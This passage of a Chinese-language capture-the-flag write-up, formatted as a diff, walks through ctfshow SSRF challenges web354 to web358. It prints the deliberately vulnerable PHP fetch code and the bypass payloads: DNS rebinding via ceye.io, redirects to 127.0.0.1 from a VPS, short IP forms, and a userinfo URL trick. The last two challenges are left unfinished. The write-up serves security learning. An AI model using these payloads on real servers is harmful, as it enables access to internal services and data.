+   url=http://0.0.0.0/flag.php
+   ```
+
+   ![](img/image-20210621212831093.png)
+
+
+
+### web354
+
+1. 依旧代码审计
+
+   ```php
+    <?php
+   error_reporting(0);
+   highlight_file(__FILE__);
+   $url=$_POST['url'];
+   $x=parse_url($url);
+   if($x['scheme']==='http'||$x['scheme']==='https')
+   {
+   if(!preg_match('/localhost|1|0|。/i', $url))
+     //过滤了localhost,1,0,。号
+   {
+   $ch=curl_init($url);
+   curl_setopt($ch, CURLOPT_HEADER, 0);
+   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+   $result=curl_exec($ch);
+   curl_close($ch);
+   echo ($result);
+   }
+   else{
+       die('hacker');
+   }
+   }
+   else{
+       die('hacker');
+   }
+   ?> 
+   ```
+
+2. 这里把`1`和`0`都过滤了，肯定不能用进制转换了，可以用自己的vps，访问页面进行重定向跳转到127.0.0.1，还有其他的方法，这里贴一下y4师傅的方法进行学习
+
+   ```shell
+   1.DNS-Rebinding攻击绕过
+   #自己去ceye.io注册绑定127.0.0.1然后记得前面加r
+   url=http://r.xxxzc8.ceye.io/flag.php
+   
+   2.利用vps搭建页面，进行跳转
+   <?php
+   header("Location:http://127.0.0.1/flag.php");
+   ?>
+   
+   3.用自己的域名，将A记录设置为127.0.0.1
+   
+   4.现成的A记录是127.0.0.1的网站
+   url=http://sudo.cc/flag.php
+   ```
+
+
+
+### web355
+
+1. 代码审计
+
+   ```php
+    <?php
+   error_reporting(0);
+   highlight_file(__FILE__);
+   $url=$_POST['url'];
+   $x=parse_url($url);
+   if($x['scheme']==='http'||$x['scheme']==='https'){
+   $host=$x['host'];
+   if((strlen($host)<=5))
+     //对IP长度进行限制
+   {
+   $ch=curl_init($url);
+   curl_setopt($ch, CURLOPT_HEADER, 0);
+   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+   $result=curl_exec($ch);
+   curl_close($ch);
+   echo ($result);
+   }
+   else{
+       die('hacker');
+   }
+   }
+   else{
+       die('hacker');
+   }
+   ?>
+   ```
+
+2. 限制ip和域名长度要小于5，所以利用特殊写法来写
+
+   ```shell
+   #POST提交
+   url=http://127.1/flag.php
+   url=http://0/flag.php
+   url=http://0.0.0/flag.php
+   ```
+
+   ![](img/image-20210621220650543.png)
+
+
+
+### web356
+
+1. 代码审计
+
+   ```php
+    <?php
+   error_reporting(0);
+   highlight_file(__FILE__);
+   $url=$_POST['url'];
+   $x=parse_url($url);
+   if($x['scheme']==='http'||$x['scheme']==='https'){
+   $host=$x['host'];
+   if((strlen($host)<=3))
+   //继续对ip/域名长度限制
+   {
+   $ch=curl_init($url);
+   curl_setopt($ch, CURLOPT_HEADER, 0);
+   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+   $result=curl_exec($ch);
+   curl_close($ch);
+   echo ($result);
+   }
+   else{
+       die('hacker');
+   }
+   }
+   else{
+       die('hacker');
+   }
+   ?>
+   ```
+
+2. 还是上一题的用特殊方法进行绕过
+
+   ```shell
+   #POST方法
+   url=http://0/flag.php
+   ```
+
+   
+
+### web357
+
+1. 代码审计
+
+   ```php
+    <?php
+   error_reporting(0);
+   highlight_file(__FILE__);
+   $url=$_POST['url'];
+   $x=parse_url($url);
+   if($x['scheme']==='http'||$x['scheme']==='https'){
+     //gethostbyname返回域名对应的IPv4地址
+   $ip = gethostbyname($x['host']);
+   echo '</br>'.$ip.'</br>';
+     //利用php过滤器把值作为 IP 地址来验证，过滤私有ip地址和保留地址
+   if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
+       die('ip!');
+   }
+   
+   
+   echo file_get_contents($_POST['url']);
+   }
+   else{
+       die('scheme');
+   }
+   ?> scheme
+   ```
+
+2. 这里可以用web355的两种办法，绕过私有地址的检测
+
+   ```shell
+   1.DNS-Rebinding攻击绕过
+   
+   2.利用vps搭建页面，重定向进行跳转
+   <?php
+   header("Location:http://127.0.0.1/flag.php");
+   ?>
+   ```
+
+3. 这里详细讲一下`DNS-Rebinding`进行绕过，首先在[ceye.io](http://ceye.io/)平台进行注册账户，然后在个人资料`profile`页面添加两个`127.0.0.1`和`随便写个公网`地址
+
+   ![](img/image-20210621232052980.png)
+
+4. 然后找到`ceye.io`个人的域名(identifier)，在前面添加r
+
+   ```shell
+   #POST提交
+   url=http://r.xxx.ceye.io/flag.php
+   ```
+5. 利用工具进行提交，当第一次提交时，域名会被解析成`127.0.0.1`，在过滤器会被检测到内网地址，会输出`ip!`，因为重绑定的原因，每过几秒就会刷新域名绑定ip信息，重新提交后，域名会被解析成`1.1.1.120`绕过过滤器检测，在`file_get_contents`又会重新解析为`127.0.0.1`，获取到flag.php，达到ssrf的攻击效果。
+
+   ![](img/image-20210621233214139.png)
+
+   `DNS-Rebinding`参考文档:https://www.freebuf.com/column/194861.html
+
+   
+
+### web358
+
+1. 代码审计
+
+   ```php
+   <?php
+   error_reporting(0);
+   highlight_file(__FILE__);
+   $url=$_POST['url'];
+   $x=parse_url($url);
+   if(preg_match('/^http:\/\/ctf\..*show$/i',$url))
+     //正则匹配http://ctf.开头show结尾的url
+   {
+     
+       echo file_get_contents($url);
+   } 
+   ```
+
+2. 所以要利用 URL 解析问题进行构造url
+
+   ```shell
+   #POST提交
+   url=http://ctf.@127.0.0.1/flag.php?show
+   ```
+
+   ![](img/image-20210622112333622.png)
+
+
+
+### web359
+
+利用Gophers攻击，以后补坑
+
+### web360
+
+利用Gophers攻击，以后补坑
